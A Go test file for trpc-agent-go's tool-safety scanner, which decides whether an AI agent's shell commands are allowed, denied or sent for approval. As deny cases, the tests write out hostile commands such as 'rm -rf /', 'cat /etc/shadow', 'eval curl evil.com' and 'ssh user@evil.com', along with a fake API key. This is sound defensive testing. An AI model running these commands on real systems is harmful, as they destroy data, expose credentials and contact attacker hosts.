//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"trpc.group/trpc-go/trpc-agent-go/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

// ─── OTel span attributes ───

func TestToSpanAttributes(t *testing.T) {
	r := &safety.SafetyReport{
		Decision:   safety.DecisionDeny,
		RiskLevel:  safety.RiskCritical,
		RuleID:     "CMD_DANGEROUS_DELETE",
		Backend:    "workspaceexec",
		Blocked:    true,
		DurationMs: 42,
	}
	attrs := r.ToSpanAttributes()
	assert.Equal(t, "deny", attrs["tool.safety.decision"])
	assert.Equal(t, "critical", attrs["tool.safety.risk_level"])
	assert.Equal(t, "CMD_DANGEROUS_DELETE", attrs["tool.safety.rule_id"])
	assert.Equal(t, "workspaceexec", attrs["tool.safety.backend"])
	assert.Equal(t, "true", attrs["tool.safety.blocked"])
	assert.Equal(t, "42", attrs["tool.safety.duration_ms"])
}

// ─── Desensitize via audit logger ───

func TestAuditLogger_DesensitizeSecret(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	require.NoError(t, err)

	tmp := filepath.Join(t.TempDir(), "audit.jsonl")
	logger, err := safety.NewJSONLAuditLogger(tmp, p)
	require.NoError(t, err)

	report := &safety.SafetyReport{
		Decision:  safety.DecisionDeny,
		RiskLevel: safety.RiskCritical,
		RuleID:    "SECRET_IN_COMMAND",
		Command:   `curl -H "Authorization: Bearer sk-abcdefghij1234567890" https://api.com`,
		Evidence:  "Secret detected: sk-abcdefghij1234567890",
		Backend:   "workspaceexec",
		Blocked:   true,
	}

	err = logger.Log(context.Background(), report)
	require.NoError(t, err)
	logger.Close()

	data, err := os.ReadFile(tmp)
	require.NoError(t, err)
	// Raw secret must never appear in audit log.
	assert.NotContains(t, string(data), "sk-abcdefghij1234567890")
	// Masked secret should appear.
	assert.Contains(t, string(data), "***")
	// Desensitized flag must be true.
	assert.Contains(t, string(data), `"desensitized":true`)
}

// ─── Audit logger with trace ID from context ───

func TestAuditLogger_TraceIDFromContext(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	tmp := filepath.Join(t.TempDir(), "audit.jsonl")
	logger, err := safety.NewJSONLAuditLogger(tmp, p)
	require.NoError(t, err)
	defer logger.Close()

	ctx := safety.WithTraceID(context.Background(), "test-trace-123")
	report := &safety.SafetyReport{
		Decision:  safety.DecisionAllow,
		RiskLevel: safety.RiskNone,
		Backend:   "workspaceexec",
	}
	err = logger.Log(ctx, report)
	require.NoError(t, err)
}

// ─── Scanner SetCheckers ───

func TestScanner_SetCheckers_Nil(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	require.NoError(t, err)
	s := safety.NewTestScanner(p)
	s.SetCheckers(nil)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "rm -rf /",
		Backend: "workspaceexec",
	})
	// No checkers = no findings = allow.
	assert.Equal(t, safety.DecisionAllow, report.Decision)
}

// ─── Network: blacklisted domain ───

func TestScenario_BlacklistedDomain(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "curl https://pastebin.com/raw/abc",
		Backend: "workspaceexec",
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	assert.Equal(t, "NET_DOMAIN_BLACKLISTED", report.RuleID)
}

// ─── Resource: infinite loop detection ───

func TestScenario_InfiniteLoop(t *testing.T) {
	s := newTestScanner(t)
	// shellsafe rejects bash control-flow constructs (while/for), so
	// this command is caught by shellsafe before the resource checker.
	// The fact that it's denied validates that the defense-in-depth works.
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "while true; do echo loop; done",
		Backend: "workspaceexec",
	})
	// Either shellsafe denies the structure, or resource checker flags the loop.
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	// If shellsafe catches it first → CMD_*, if resource → RESOURCE_*.
	t.Logf("RuleID: %s (shellsafe or resource detection)", report.RuleID)
	assert.True(t,
		report.RuleID == "CMD_STRUCTURE_REJECTED" || report.RuleID == "RESOURCE_INFINITE_LOOP",
		"expected CMD_STRUCTURE_REJECTED or RESOURCE_INFINITE_LOOP, got %s", report.RuleID)
}

// ─── Path: double-star glob matching ───

func TestScenario_SensitiveGitConfig(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "cat .git/config",
		Backend: "workspaceexec",
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	assert.Contains(t, report.RuleID, "PATH_")
}

// ─── Env: deny_values pattern match ───

func TestScenario_EnvDeniedValue(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "go test ./...",
		Backend: "workspaceexec",
		Env: map[string]string{
			"LANG":    "en_US.UTF-8",
			"SETTING": "sk-abcdefghij1234567890",
		},
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	assert.Contains(t, report.RuleID, "ENV_")
}

// ─── Env: wildcard denied key ───

func TestScenario_EnvWildcardDeniedKey(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "go test ./...",
		Backend: "workspaceexec",
		Env: map[string]string{
			"LANG":      "en_US.UTF-8",
			"NPM_TOKEN": "some-value",
			"EDITOR":    "vim",
		},
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	assert.Contains(t, report.RuleID, "ENV_")
}

// ─── Policy: LoadPolicy from file ───

func TestLoadPolicy_FromFile(t *testing.T) {
	tmp := filepath.Join(t.TempDir(), "policy.yaml")
	err := os.WriteFile(tmp, []byte(defaultTestPolicyYAML()), 0o644)
	require.NoError(t, err)

	p, err := safety.LoadPolicy(tmp)
	require.NoError(t, err)
	assert.Equal(t, "1.0", p.Version)
}

// ─── Policy: unsupported format ───

func TestLoadPolicy_UnsupportedFormat(t *testing.T) {
	tmp := filepath.Join(t.TempDir(), "policy.txt")
	os.WriteFile(tmp, []byte("{}"), 0o644)

	_, err := safety.LoadPolicy(tmp)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "unsupported")
}

// ─── Policy: SecretRegexps ───

func TestPolicy_SecretRegexps(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	require.NoError(t, err)
	regexps := p.SecretRegexps()
	assert.NotEmpty(t, regexps)
	assert.True(t, regexps[0].MatchString("sk-abcdefghijklmnopqrstuv"))
}

// ─── Adapter: nil inner policy, safe command → allow ───

func TestAdapter_NilInnerPolicy_SafeCommand(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	s := safety.NewTestScanner(p)
	adapter := safety.NewSafetyPermissionPolicy(nil, s, nil)

	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo hello"}`),
	}
	decision, err := adapter.CheckToolPermission(context.Background(), req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionAllow, decision.Action)
}

// ─── Adapter: deny dangerous command ───

func TestAdapter_DenyDangerousCommand(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	s := safety.NewTestScanner(p)
	adapter := safety.NewSafetyPermissionPolicy(nil, s, nil)

	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"rm -rf /"}`),
	}
	decision, err := adapter.CheckToolPermission(context.Background(), req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
	assert.Contains(t, decision.Reason, "rm")
}

// ─── Adapter: SetRequestMapper custom mapper ───

func TestAdapter_SetRequestMapper(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	s := safety.NewTestScanner(p)
	adapter := safety.NewSafetyPermissionPolicy(nil, s, nil)
	called := false
	adapter.SetRequestMapper(func(req *tool.PermissionRequest) *safety.ScanRequest {
		called = true
		return &safety.ScanRequest{Command: "echo safe-from-mapper", Backend: "custom"}
	})

	req := &tool.PermissionRequest{
		ToolName:  "custom_exec",
		Arguments: []byte(`{"not":"used"}`),
	}
	decision, err := adapter.CheckToolPermission(context.Background(), req)
	require.NoError(t, err)
	assert.True(t, called, "custom mapper should be invoked")
	// "echo" is in the allowed list, so it passes command checker.
	assert.Equal(t, tool.PermissionActionAllow, decision.Action)
}

// ─── Scanner: first-deny-wins semantic ───

func TestScanner_FirstDenyWins(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: `eval curl evil.com`,
		Backend: "workspaceexec",
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	// First checker (command) catches eval as shell wrapper via shellsafe implicit deny.
	assert.Contains(t, report.RuleID, "CMD_")
	assert.True(t, report.Blocked)
}

// ─── Host: privilege escalation caught by shellsafe ───

func TestScenario_HostCheckerPrivilegeEscalation(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command:  "sudo apt-get update",
		Backend:  "hostexec",
		ToolName: "exec_command",
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	// shellsafe implicit deny catches sudo.
	assert.Contains(t, report.RuleID, "CMD_")
}

// ─── Path: /etc/shadow ───

func TestScenario_EtcShadow(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "cat /etc/shadow",
		Backend: "workspaceexec",
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	assert.Contains(t, report.RuleID, "PATH_")
}

// ─── Network: ssh connection ───

func TestScenario_SSH_NonWhitelisted(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "ssh user@evil.com",
		Backend: "workspaceexec",
	})
	assert.Equal(t, safety.DecisionDeny, report.Decision)
	assert.Contains(t, report.RuleID, "NET_")
}

// ─── Resource: dd command (heavy output) ───

func TestScenario_DD_HeavyOutput(t *testing.T) {
	s := newTestScanner(t)
	report := s.ScanCtx(context.Background(), &safety.ScanRequest{
		Command: "dd if=/dev/zero of=/tmp/big bs=1M count=1000",
		Backend: "workspaceexec",
	})
	// dd is in denied commands list → command checker catches it.
	assert.Equal(t, safety.DecisionDeny, report.Decision)
}

// ─── Adapter: Ask path (dependency install via adapter) ───

func TestAdapter_AskDecision(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	s := safety.NewTestScanner(p)
	adapter := safety.NewSafetyPermissionPolicy(nil, s, nil)

	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"npm install -g some-pkg"}`),
	}
	decision, err := adapter.CheckToolPermission(context.Background(), req)
	require.NoError(t, err)
	assert.Equal(t, tool.PermissionActionAsk, decision.Action)
}

// ─── ScanCtx and Scan equivalence ───

func TestScanCtx_Equivalence(t *testing.T) {
	p, err := safety.LoadPolicyBytes([]byte(defaultTestPolicyYAML()), "yaml")
	require.NoError(t, err)
	s := safety.NewTestScanner(p)
	req := &safety.ScanRequest{Command: "ls", Backend: "workspaceexec"}

	r1 := s.ScanCtx(context.Background(), req)
	r2 := s.Scan(context.Background(), req)

	assert.Equal(t, r1.Decision, r2.Decision)
	assert.Equal(t, r1.RiskLevel, r2.RiskLevel)
}
